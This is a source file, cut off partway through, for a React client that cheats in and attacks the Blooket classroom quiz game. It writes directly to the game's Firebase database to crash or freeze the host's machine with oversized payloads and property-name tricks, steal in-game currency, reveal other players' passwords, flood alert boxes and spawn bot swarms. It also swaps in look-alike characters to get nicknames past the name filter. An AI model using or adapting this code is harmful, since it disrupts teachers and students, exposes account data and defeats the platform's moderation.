import { useState, useRef, useEffect, useCallback, useId } from "react";
import { initializeApp, deleteApp, type FirebaseApp } from "firebase/app";
import { getAuth, signInWithCustomToken } from "firebase/auth";
import { getDatabase, ref, set, onValue, type Database } from "firebase/database";

const FIREBASE_CONFIG = {
  apiKey: "AIzaSyCA-cTOnX19f6LFnDVVsHXya3k6ByP_MnU",
  authDomain: "blooket-2020.firebaseapp.com",
  projectId: "blooket-2020",
  storageBucket: "blooket-2020.appspot.com",
  messagingSenderId: "741533559105",
  appId: "1:741533559105:web:b8cbb10e6123f2913519c0",
};

const BLOOKS = [
  "Chick","Chicken","Cow","Goat","Horse","Pig","Sheep","Duck","Alpaca","Dog",
  "Cat","Rabbit","Goldfish","Hamster","Turtle","Kitten","Puppy","Bear","Moose","Fox",
  "Raccoon","Squirrel","Owl","Hedgehog","Deer","Wolf","Beaver","Tiger","Orangutan",
  "Cockatoo","Parrot","Anaconda","Jaguar","Macaw","Toucan","Panther","Capuchin",
  "Gorilla","Hippo","Rhino","Giraffe","Snowy Owl","Polar Bear","Arctic Fox",
  "Baby Penguin","Penguin","Arctic Hare","Seal","Walrus","Witch","Wizard","Elf",
  "Fairy","Slime Monster","Jester","Dragon","Queen","Unicorn","King","Alice",
  "Cheshire Cat","Mad Hatter","Toast","Cereal","Yogurt","Pizza","Earth","Meteor",
  "Stars","Alien","Planet","UFO","Spaceship","Astronaut","Lil Bot","Lovely Bot",
  "Angry Bot","Happy Bot","Watson","Buddy Bot","Brainy Bot","Mega Bot","Old Boot",
  "Jellyfish","Clownfish","Frog","Crab","Pufferfish","Blobfish","Octopus","Narwhal",
  "Dolphin","Baby Shark","Megalodon","Panda","Sloth","Flamingo","Zebra","Elephant",
  "Lemur","Peacock","Chameleon","Lion","Stegosaurus","Velociraptor","Brontosaurus",
  "Triceratops","Tyrannosaurus Rex","Dink","Donk","Yeti","Dingo","Echidna","Koala",
  "Platypus","Joey","Kangaroo","Crocodile","Deckhand","Buccaneer","Kraken",
  "Captain Blackbeard","Pumpkin","Vampire","Zombie","Mummy","Ghost","Werewolf",
  "Frankenstein","Snowman","Santa Claus","Reindeer","Rainbow Astronaut",
  "Red Astronaut","Blue Astronaut","Green Astronaut","Yellow Astronaut",
  "Purple Astronaut","Leprechaun",
];

const RANDOM_ADJECTIVES = ["Fast","Crazy","Wild","Cool","Dark","Mega","Super","Ultra","Hyper","Turbo","Epic","Neon","Laser","Storm","Fire","Ice","Shadow","Ghost","Cyber","Alpha"];
const RANDOM_NOUNS = ["Shark","Tiger","Dragon","Eagle","Fox","Wolf","Hawk","Bear","Lion","Cobra","Panda","Viper","Falcon","Raven","Panther","Phoenix","Sphinx","Titan","Nova","Blaze"];

function randomName(): string {
  const adj = RANDOM_ADJECTIVES[Math.floor(Math.random() * RANDOM_ADJECTIVES.length)];
  const noun = RANDOM_NOUNS[Math.floor(Math.random() * RANDOM_NOUNS.length)];
  return `${adj}${noun}${Math.floor(Math.random() * 99) + 1}`;
}

function bypassFilter(str: string): string {
  return str
    .replace(/a/g, "\u0430").replace(/c/g, "\u0441").replace(/e/g, "\u0435")
    .replace(/i/g, "\u0456").replace(/j/g, "\u0458").replace(/o/g, "\u043E")
    .replace(/p/g, "\u0440").replace(/s/g, "\u0455").replace(/x/g, "\u0445")
    .replace(/y/g, "\u0443").replace(/A/g, "\u0410").replace(/B/g, "\u0412")
    .replace(/C/g, "\u0421").replace(/E/g, "\u0415").replace(/H/g, "\u041D")
    .replace(/I/g, "\u0406").replace(/K/g, "\u039A").replace(/M/g, "\u041C")
    .replace(/O/g, "\u041E").replace(/P/g, "\u0420").replace(/S/g, "\u0405")
    .replace(/T/g, "\u0422").replace(/X/g, "\u0425").replace(/Y/g, "\u03A5");
}

function coerceValue(val: string | number): string | number {
  if (typeof val === "number") return val;
  if (val.trim() === "") return val;
  const n = Number(val);
  if (Number.isFinite(n)) return n;
  return val;
}

function makeLongText(len: number): string {
  const chars = ["\u200e", "\u200f", "\u200b", "\u200c", "\u200d", "\u2060"];
  return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function makeBigText(adtext: string): string {
  let r = "1".repeat(100);
  for (let i = 0; i < 500; i++) {
    r += adtext;
    if (i % 10 === 0) r += "\n\r";
    else r += " ";
  }
  return r;
}

function makeFloodText(name: string, stext: string): string {
  return `${name}:${Date.now()}${new Array(1700).fill(stext + " ").join("")}`;
}

// ── Bot Instance ──────────────────────────────────────────────────────────────

interface BotInstance {
  id: string;
  name: string;
  blook: string;
  gid: string;
  status: "connecting" | "connected" | "error" | "kicked";
  errorMsg?: string;
  fbdb: Database | null;
  liveApp: FirebaseApp | null;
  isPrimary: boolean;
}

// Primary bot singleton (used by cheats)
const primaryRef: {
  gid: string; name: string; type: string;
  fbdb: Database | null; liveApp: FirebaseApp | null; connected: boolean;
} = { gid: "", name: "", type: "", fbdb: null, liveApp: null, connected: false };

type GameObj = Record<string, unknown>;
let gameObject: GameObj = {};

async function dbSet(db: Database | null, path: string, val: unknown) {
  if (!db) return;
  await set(ref(db, path), val);
}

async function setUserVal(path: string, val: unknown) {
  const safe = typeof val === "string" || typeof val === "number" ? coerceValue(val as string | number) : val;
  await dbSet(primaryRef.fbdb, `/${primaryRef.gid}/c/${primaryRef.name}/${path}`, safe);
}

async function setTeamVal(path: string, val: unknown) {
  await dbSet(primaryRef.fbdb, `/${primaryRef.gid}/a/${primaryRef.name}/${path}`, val);
}

function getPlayers(): string[] {
  if (!gameObject || !(gameObject as Record<string, unknown>).c) return [];
  return Object.keys((gameObject as Record<string, unknown>).c as object);
}

// ── Cheats ────────────────────────────────────────────────────────────────────

type CheatDef =
  | { type: "button"; name: string; action: (btn: HTMLButtonElement) => void }
  | { type: "input"; name: string; action: (val: string) => void }
  | { type: "select"; name: string; computeOptions: () => string[]; action: (val: string) => void }
  | { type: "staticsel"; name: string; values: string[]; action: (val: string) => void };

const CHEATS: Record<string, CheatDef[]> = {
  Hack: [
    { type: "button", name: "Crash Host", action: async (b) => { await setUserVal("cr/t", "t"); b.textContent = "Crashing…"; } },
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "tat/t" : "tat", "t"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Turn Host Screen Green", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; if (on) { let t = "a".repeat(63); for (let i = 0; i < 300000; i++) { t += String.fromCharCode(3655); if (i % 61 === 0) t += " "; } t += "a".repeat(63); await setUserVal("cr", t); } else { await setUserVal("cr", 0); } b.textContent = on ? "Undo Green Screen" : "Turn Host Screen Green"; } },
    { type: "button", name: "Set Crash Password", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "p/toString" : "p", on ? "t" : "DogLover3"); b.textContent = on ? "Remove Crash Password" : "Set Crash Password"; } },
    { type: "button", name: "Set Freeze Password", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal("p", on ? makeLongText(3000000) : "DogLover3"); b.textContent = on ? "Remove Freeze Password" : "Set Freeze Password"; } },
    { type: "input", name: "Set Crypto Amount", action: (v) => setUserVal("cr", v) },
    { type: "input", name: "Set Password", action: (v) => setUserVal("p", v) },
    { type: "select", name: "Get Player Password", computeOptions: getPlayers, action: (d) => { const pw = ((gameObject as Record<string, Record<string, unknown>>).c?.[d] as Record<string, unknown>)?.p; alert(`Password for ${d}: ${pw ?? "(none)"}`); } },
    { type: "select", name: "Steal Crypto From", computeOptions: getPlayers, action: (d) => { const amt = prompt("How much crypto to steal?"); if (amt) setUserVal("tat", `${d}:${amt}`); } },
    { type: "input", name: "Advertise Text (Host Screen)", action: (v) => setUserVal("cr", makeBigText(v)) },
    { type: "select", name: "Flood Alert Box", computeOptions: getPlayers, action: (d) => { const txt = prompt("Text to flood alert with?"); if (txt) setUserVal("tat", makeFloodText(d, txt)); } },
  ],
  Gold: [
    { type: "button", name: "Crash Host", action: async (b) => { await setUserVal("g/t", "t"); b.textContent = "Crashing…"; } },
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "tat/t" : "tat", "t"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Max Gold (9,999,999)", action: async () => { await setUserVal("g", 9999999); } },
    { type: "input", name: "Set Gold", action: (v) => setUserVal("g", coerceValue(v)) },
    { type: "select", name: "Steal Gold From", computeOptions: getPlayers, action: (d) => { const amt = prompt("How much gold?"); if (amt) setUserVal("tat", `${d}:${amt}`); } },
    { type: "select", name: "Set Player's Gold", computeOptions: getPlayers, action: (d) => { const amt = prompt("Set gold to?"); if (amt) setUserVal("tat", `${d}:swap:${amt}`); } },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("tat", makeFloodText(primaryRef.name, v)) },
    { type: "select", name: "Send Ad Text to Player", computeOptions: getPlayers, action: (d) => { const txt = prompt("Ad text (no colons):"); if (txt && !txt.includes(":")) { setUserVal("b", "Dog:" + new Array(500).fill(txt).join(" ")); setUserVal("tat", `${d}:100`); } } },
  ],
  Candy: [
    { type: "button", name: "Crash Host", action: async (b) => { await setUserVal("g/t", "t"); b.textContent = "Crashing…"; } },
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "tat/t" : "tat", "t"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Max Candy (9,999,999)", action: async () => { await setUserVal("g", 9999999); } },
    { type: "input", name: "Set Candy", action: (v) => setUserVal("g", coerceValue(v)) },
    { type: "select", name: "Steal Candy From", computeOptions: getPlayers, action: (d) => { const amt = prompt("How much candy?"); if (amt) setUserVal("tat", `${d}:${amt}`); } },
    { type: "select", name: "Set Player's Candy", computeOptions: getPlayers, action: (d) => { const amt = prompt("Set candy to?"); if (amt) setUserVal("tat", `${d}:swap:${amt}`); } },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("tat", makeFloodText(primaryRef.name, v)) },
  ],
  "Defense 2": [
    { type: "button", name: "Crash Host", action: async (b) => { await setUserVal("d/t", "t"); b.textContent = "Crashing…"; } },
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "r/toString" : "r", on ? "t" : 1); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "input", name: "Set Damage", action: (v) => setUserVal("d", coerceValue(v)) },
    { type: "input", name: "Set Round", action: (v) => setUserVal("r", coerceValue(v)) },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("r", `${Date.now()}${new Array(1700).fill(v + " ").join("")}`) },
  ],
  Fish: [
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "f/t" : "f", on ? "t" : "Old Boot"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Activate Frenzy", action: async () => { await setUserVal("s", true); await setUserVal("f", "Frenzy"); } },
    { type: "button", name: "Max Weight (999,999)", action: async () => { await setUserVal("w", 999999); } },
    { type: "input", name: "Set Weight", action: (v) => setUserVal("w", coerceValue(v)) },
    { type: "input", name: "Set Caught Fish", action: (v) => setUserVal("f", v) },
    { type: "input", name: "Send Distraction", action: (v) => { setUserVal("s", true); setUserVal("f", v); } },
  ],
  Pirate: [
    { type: "button", name: "Crash Host", action: async (b) => { await setUserVal("d/t", "t"); b.textContent = "Crashing…"; } },
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "tat/t" : "tat", "t"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Max Doubloons (9,999,999)", action: async () => { await setUserVal("d", 9999999); } },
    { type: "input", name: "Set Doubloons", action: (v) => setUserVal("d", coerceValue(v)) },
    { type: "select", name: "Steal Doubloons From", computeOptions: getPlayers, action: (d) => { const amt = prompt("How many doubloons?"); if (amt) setUserVal("tat", `${d}:${amt}`); } },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("tat", makeFloodText(primaryRef.name, v)) },
  ],
  Dino: [
    { type: "button", name: "Crash Host", action: async (b) => { await setUserVal("f/t", "t"); b.textContent = "Crashing…"; } },
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "tat/t" : "tat", "t"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Max Fossils (9,999,999)", action: async () => { await setUserVal("f", 9999999); } },
    { type: "input", name: "Set Fossils", action: (v) => setUserVal("f", coerceValue(v)) },
    { type: "staticsel", name: "Set Cheating Flag", values: ["true", "false"], action: (v) => setUserVal("ic", v) },
    { type: "select", name: "Catch Player Cheating", computeOptions: getPlayers, action: (d) => setUserVal("tat", `${d}:true`) },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("tat", makeFloodText(primaryRef.name, v)) },
  ],
  Cafe: [
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "tat/t" : "tat", "t"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Max Cash (9,999,999)", action: async () => { await setUserVal("ca", 9999999); } },
    { type: "input", name: "Set Cash", action: (v) => setUserVal("ca", coerceValue(v)) },
    { type: "input", name: "Set Upgrade (e.g. Cereal:1)", action: (v) => setUserVal("up", v) },
    { type: "select", name: "Attack Player", computeOptions: getPlayers, action: (d) => { const a = prompt("Attack type (inspect, pay, etc)?"); if (a) setUserVal("tat", `${d}:${a}`); } },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("up", `a:${Date.now()}${new Array(1700).fill(v + " ").join("")}`) },
  ],
  Brawl: [
    { type: "button", name: "Crash Host", action: async (b) => { await setUserVal("xp/t", "t"); b.textContent = "Crashing…"; } },
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "up/t" : "up", on ? "t" : "Dark Energy:2"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Max XP (9,999,999)", action: async () => { await setUserVal("xp", 9999999); } },
    { type: "input", name: "Set XP", action: (v) => setUserVal("xp", coerceValue(v)) },
    { type: "select", name: "Steal XP From", computeOptions: getPlayers, action: (d) => { const amt = prompt("How much XP?"); if (amt) setUserVal("tat", `${d}:${amt}`); } },
    { type: "input", name: "Set Upgrade (upgrade:level)", action: (v) => setUserVal("up", v) },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("up", `__proto__:${Date.now()}${new Array(1700).fill(v + " ").join("")}`) },
  ],
  Racing: [
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "pr/toString" : "pr", on ? "t" : 0); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Win Instantly (0 Questions)", action: async () => { await setUserVal("pr", 0); } },
    { type: "input", name: "Set Questions Left", action: (v) => setUserVal("pr", coerceValue(v)) },
    { type: "select", name: "Attack Player", computeOptions: getPlayers, action: (d) => { const a = prompt("Attack (rocket, etc)?"); if (a) setUserVal("tat", `${d}:${a}`); } },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("pr", `${Date.now()}${new Array(1700).fill(v + " ").join("")}`) },
  ],
  Classic: [
    { type: "button", name: "Freeze Question", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "a/toString" : "a", on ? "t" : 1); b.textContent = on ? "Unfreeze Question" : "Freeze Question"; } },
    { type: "button", name: "Max Tokens (9,999,999)", action: async () => { await setUserVal("t", 9999999); } },
    { type: "input", name: "Set Tokens", action: (v) => setUserVal("t", coerceValue(v)) },
    { type: "select", name: "Steal Tokens From", computeOptions: getPlayers, action: (d) => { const amt = prompt("How many tokens?"); if (amt) setUserVal("tat", `${d}:${amt}`); } },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("a", `${Date.now()}${new Array(1700).fill(v + " ").join("")}`) },
  ],
  Royale: [
    { type: "button", name: "Send Crash Answer", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await dbSet(primaryRef.fbdb, `${primaryRef.gid}/a/${primaryRef.name}/a/toString`, on ? "t" : 2); b.textContent = on ? "Unsend Crash Answer" : "Send Crash Answer"; } },
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "tat/t" : "tat", "t"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Max Eliminations (9,999)", action: async () => { await setUserVal("e", 9999); } },
    { type: "input", name: "Set Eliminations", action: (v) => setUserVal("e", coerceValue(v)) },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("tat", makeFloodText(primaryRef.name, v)) },
  ],
  Rush: [
    { type: "button", name: "Freeze Host's Computer", action: async (b) => { await setUserVal("bs", 1e307); b.textContent = "Done!"; } },
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "d/toString" : "d", "t"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Max Blooks (9,999,999)", action: async () => { await setUserVal("bs", 9999999); } },
    { type: "input", name: "Set Blooks", action: (v) => setUserVal("bs", coerceValue(v)) },
    { type: "input", name: "Set Defense", action: (v) => setUserVal("d", coerceValue(v)) },
    { type: "select", name: "Steal Blooks From", computeOptions: getPlayers, action: (d) => { const amt = prompt("How many blooks?"); if (amt) setUserVal("tat", `${d}:${amt}`); } },
    { type: "input", name: "Advertise Text", action: (v) => setUserVal("d", makeBigText(v)) },
  ],
  "Rush (Teams)": [
    { type: "button", name: "Freeze Host's Computer", action: async (b) => { await setTeamVal("bs", 1e307); b.textContent = "Done!"; } },
    { type: "button", name: "Max Blooks (9,999,999)", action: async () => { await setTeamVal("bs", 9999999); } },
    { type: "input", name: "Set Blooks", action: (v) => setTeamVal("bs", parseInt(v)) },
    { type: "input", name: "Set Defense", action: (v) => setTeamVal("d", parseInt(v)) },
  ],
  Factory: [
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "ca/toString" : "ca", on ? "t" : 0); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Max Cash (9,999,999)", action: async () => { await setUserVal("ca", 9999999); } },
    { type: "input", name: "Set Cash", action: (v) => setUserVal("ca", coerceValue(v)) },
    { type: "select", name: "Steal Cash From", computeOptions: getPlayers, action: (d) => { const amt = prompt("How much cash?"); if (amt) setUserVal("tat", `${d}:${amt}`); } },
    { type: "staticsel", name: "Send Distraction", values: ["dp"], action: (v) => setUserVal("tat", v) },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("tat", makeFloodText(primaryRef.name, v)) },
  ],
  Toy: [
    { type: "button", name: "Crash Host", action: async (b) => { await setUserVal("t/t", "t"); b.textContent = "Crashing…"; } },
    { type: "button", name: "Freeze Scoreboard", action: async (b) => { const on = b.dataset.on !== "1"; b.dataset.on = on ? "1" : "0"; await setUserVal(on ? "tat/t" : "tat", "t"); b.textContent = on ? "Unfreeze Scoreboard" : "Freeze Scoreboard"; } },
    { type: "button", name: "Max Toys (9,999,999)", action: async () => { await setUserVal("t", 9999999); } },
    { type: "input", name: "Set Toys", action: (v) => setUserVal("t", coerceValue(v)) },
    { type: "select", name: "Steal Toys From", computeOptions: getPlayers, action: (d) => { const amt = prompt("How many toys?"); if (amt) setUserVal("tat", `${d}:${amt}`); } },
    { type: "select", name: "Set Player's Toys", computeOptions: getPlayers, action: (d) => { const amt = prompt("Set toys to?"); if (amt) setUserVal("tat", `${d}:swap:${amt}`); } },
    { type: "input", name: "Flood Alert Box", action: (v) => setUserVal("tat", makeFloodText(primaryRef.name, v)) },
  ],
};

const GLOBAL_CHEATS: CheatDef[] = [
  { type: "staticsel", name: "Set Blook", values: BLOOKS, action: (v) => setUserVal("b", v) },
  { type: "input", name: "Set Banner", action: (v) => setUserVal("bg", v) },
  {
    type: "button", name: "Freeze Host (All Modes)",
    action: async (b) => {
      const map: Record<string, string> = { Hack: "cr", Gold: "g", Candy: "g", "Defense 2": "d", Pirate: "d", Fish: "w", Brawl: "xp", Factory: "ca" };
      await setUserVal(map[primaryRef.type] ?? "cr", makeLongText(150000));
      b.textContent = "Freezing…";
    },
  },
];

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

// ── Helpers ───────────────────────────────────────────────────────────────────

async function joinOneBot(gid: string, name: string, incognito: boolean): Promise<{
  liveApp: FirebaseApp; fbdb: Database; blook: string;
}> {
  const res = await fetch(`${BASE}/api/blooket/join`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ id: gid, name }),
  });
  const text = await res.text();
  let body: { success: boolean; fbToken?: string; fbShardURL?: string; msg?: string };
  try {
    body = JSON.parse(text) as typeof body;
  } catch {
    throw new Error("Server returned an unexpected response — check your game code and try again.");
  }
  if (!body.success || !body.fbToken || !body.fbShardURL) {
    throw new Error(body.msg ?? "Failed to join");
  }

  const liveApp = initializeApp(
    { ...FIREBASE_CONFIG, databaseURL: body.fbShardURL },
    `bot-${Date.now()}-${Math.random()}`
  );
  const auth = getAuth(liveApp);
  await signInWithCustomToken(auth, body.fbToken);
  const fbdb = getDatabase(liveApp);

  const blook = incognito
    ? BLOOKS[Math.floor(Math.random() * 37)]
    : "Rainbow Astronaut";

  await set(ref(fbdb, `${gid}/c/${name}`), { b: blook });

  return { liveApp, fbdb, blook };
}

// ── App ───────────────────────────────────────────────────────────────────────

export default function App() {
  const [gameCode, setGameCode] = useState("");
  const [nickname, setNickname] = useState("");
  const [incognito, setIncognito] = useState(true);
  const [bypassF, setBypassF] = useState(false);
  const [fpSwitch, setFpSwitch] = useState(true);

  // flood settings
  const [botCount, setBotCount] = useState(1);
  const [namePrefix, setNamePrefix] = useState("");

  const [status, setStatus] = useState("Ready");
  const [error, setError] = useState("");
  const [gameType, setGameType] = useState("");
  const [gamePlayers, setGamePlayers] = useState<string[]>([]);
  const [bots, setBots] = useState<BotInstance[]>([]);
  const [spawning, setSpawning] = useState(false);

  const joinedRef = useRef(false);
  const botsRef = useRef<BotInstance[]>([]);

  const showError = useCallback((msg: string) => {
    setError(msg);
    setTimeout(() => setError(""), 5000);
  }, []);

  const isConnected = bots.some((b) => b.status === "connected");

  // ── Sync botsRef with state
  useEffect(() => {
    botsRef.current = bots;
  }, [bots]);

  // ── Disconnect all bots on unmount
  useEffect(() => {
    return () => {
      botsRef.current.forEach((bot) => {
        if (bot.fbdb) dbSet(bot.fbdb, `${bot.gid}/c/${bot.name}`, null).catch(() => {});
        if (bot.liveApp) deleteApp(bot.liveApp).catch(() => {});
      });
    };
  }, []);

  // ── Kick a single bot
  const kickBot = useCallback(async (botId: string) => {
    const bot = botsRef.current.find((b) => b.id === botId);
    if (!bot || bot.status === "kicked") return;
    try {
      if (bot.fbdb) await dbSet(bot.fbdb, `${bot.gid}/c/${bot.name}`, null);
      if (bot.liveApp) await deleteApp(bot.liveApp);
    } catch {}
    setBots((prev) => prev.map((b) => b.id === botId ? { ...b, status: "kicked", fbdb: null, liveApp: null } : b));
    if (bot.isPrimary) {
      primaryRef.connected = false;
      primaryRef.fbdb = null;
      primaryRef.liveApp = null;
    }
  }, []);

  // ── Rename a bot
  const renameBot = useCallback(async (botId: string, newName: string) => {
    const bot = botsRef.current.find((b) => b.id === botId);
    if (!bot || bot.status !== "connected" || !bot.fbdb) return;
    const trimmed = newName.trim();
    if (!trimmed || trimmed === bot.name) return;
    try {
      await dbSet(bot.fbdb, `${bot.gid}/c/${bot.name}`, null);
      await dbSet(bot.fbdb, `${bot.gid}/c/${trimmed}`, { b: bot.blook });
      setBots((prev) => prev.map((b) =>
        b.id === botId ? { ...b, name: trimmed } : b
      ));
      if (bot.isPrimary) primaryRef.name = trimmed;
    } catch (err) {
      showError(`Rename failed: ${err instanceof Error ? err.message : "unknown"}`);
    }
  }, [showError]);

  // ── Kick all bots
  const kickAll = useCallback(async () => {
    const toKick = botsRef.current.filter((b) => b.status === "connected");
    await Promise.allSettled(toKick.map((b) => kickBot(b.id)));
    primaryRef.connected = false;
    primaryRef.fbdb = null;
    primaryRef.liveApp = null;
    gameObject = {};
    setGameType("");
    setGamePlayers([]);
    setStatus("Ready");
    joinedRef.current = false;
  }, [kickBot]);

  // ── Spawn bots
  const spawnBots = useCallback(async () => {
    if (spawning) return;
    const gid = gameCode.trim();
    if (!gid) { showError("Enter a game code first!"); return; }

    const count = Math.max(1, Math.min(50, botCount));
    const prefix = namePrefix.trim();

    setSpawning(true);

    const newBots: BotInstance[] = Array.from({ length: count }, (_, i) => ({
      id: `${Date.now()}-${i}-${Math.random()}`,
      name: prefix
        ? `${prefix}${bots.filter(b => b.status !== "kicked").length + i + 1}`
        : randomName(),
      blook: BLOOKS[Math.floor(Math.random() * 37)],
      gid,
      status: "connecting" as const,
      fbdb: null,
      liveApp: null,
      isPrimary: false,
    }));

    setBots((prev) => [...prev, ...newBots]);

    const firstJoin = !joinedRef.current;
    if (firstJoin) joinedRef.current = true;

    await Promise.allSettled(
      newBots.map(async (bot, idx) => {
        let name = bot.name;
        if (bypassF) name = bypassFilter(name);
        if (fpSwitch) name = "\u0020\u0020" + name;

        try {
          const { liveApp, fbdb, blook } = await joinOneBot(gid, name, incognito);

          const isFirst = firstJoin && idx === 0;
          if (isFirst) {
            primaryRef.gid = gid;
            primaryRef.name = name;
            primaryRef.fbdb = fbdb;
            primaryRef.liveApp = liveApp;
            primaryRef.connected = true;

            onValue(ref(fbdb, `${gid}`), (snapshot) => {
              if (!primaryRef.connected) return;
              const data = snapshot.val() as GameObj;
              if (!data) { setGameType(""); setGamePlayers([]); return; }
              const gm = (data as Record<string, Record<string, string>>).s?.t ?? "Unknown";
              const finalGm = gm === "Rush" && (data as Record<string, Record<string, string>>).s?.m === "Teams" ? "Rush (Teams)" : gm;
              primaryRef.type = finalGm;
              setGameType(finalGm);
              gameObject = data;
              if ((data as Record<string, Record<string, unknown>>).c) {
                setGamePlayers(Object.keys((data as Record<string, Record<string, unknown>>).c as object));
              }
              if ((data as Record<string, string>).stg === "fin") {
                showError("Game has ended!");
              }
            });
          }

          setBots((prev) => prev.map((b) =>
            b.id === bot.id ? { ...b, name, blook, status: "connected", liveApp, fbdb, isPrimary: isFirst && idx === 0 } : b
          ));
        } catch (err) {
          setBots((prev) => prev.map((b) =>
            b.id === bot.id ? { ...b, status: "error", errorMsg: err instanceof Error ? err.message : "failed" } : b
          ));
        }
      })
    );

    setSpawning(false);
    if (firstJoin) setStatus("Connected");
  }, [spawning, gameCode, botCount, namePrefix, bots, bypassF, fpSwitch, incognito, showError]);

  // ── Join single bot (the main Join Game button)
  const joinGame = useCallback(async () => {
    if (spawning) return;
    const gid = gameCode.trim();
    const nick = nickname.trim();
    if (!gid || !nick) { showError("Enter a game code and nickname!"); return; }

    let name = nick;
    if (bypassF) name = bypassFilter(name);
    if (fpSwitch) name = "\u0020\u0020" + name;

    const botEntry: BotInstance = {
      id: `${Date.now()}-primary`,
      name,
      blook: incognito ? BLOOKS[Math.floor(Math.random() * 37)] : "Rainbow Astronaut",
      gid,
      status: "connecting",
      fbdb: null,
      liveApp: null,
      isPrimary: true,
    };

    setBots((prev) => [...prev, botEntry]);
    setSpawning(true);
    setStatus("Connecting…");
    joinedRef.current = true;

    try {
      const { liveApp, fbdb, blook } = await joinOneBot(gid, name, incognito);

      primaryRef.gid = gid;
      primaryRef.name = name;
      primaryRef.fbdb = fbdb;
      primaryRef.liveApp = liveApp;
      primaryRef.connected = true;

      onValue(ref(fbdb, `${gid}`), (snapshot) => {
        if (!primaryRef.connected) return;
        const data = snapshot.val() as GameObj;
        if (!data) { setGameType(""); setGamePlayers([]); return; }
        const gm = (data as Record<string, Record<string, string>>).s?.t ?? "Unknown";
        const finalGm = gm === "Rush" && (data as Record<string, Record<string, string>>).s?.m === "Teams" ? "Rush (Teams)" : gm;
        primaryRef.type = finalGm;
        setGameType(finalGm);
        gameObject = data;
        if ((data as Record<string, Record<string, unknown>>).c) {
          setGamePlayers(Object.keys((data as Record<string, Record<string, unknown>>).c as object));
        }
        if ((data as Record<string, string>).stg === "fin") {
          showError("Game has ended!");
        }
      });

      setBots((prev) => prev.map((b) =>
        b.id === botEntry.id ? { ...b, name, blook, status: "connected", liveApp, fbdb } : b
      ));
      setStatus("Connected");
    } catch (err) {
      setBots((prev) => prev.map((b) =>
        b.id === botEntry.id ? { ...b, status: "error", errorMsg: err instanceof Error ? err.message : "failed" } : b
      ));
      showError(err instanceof Error ? err.message : "Join failed");
      setStatus("Ready");
      joinedRef.current = false;
    } finally {
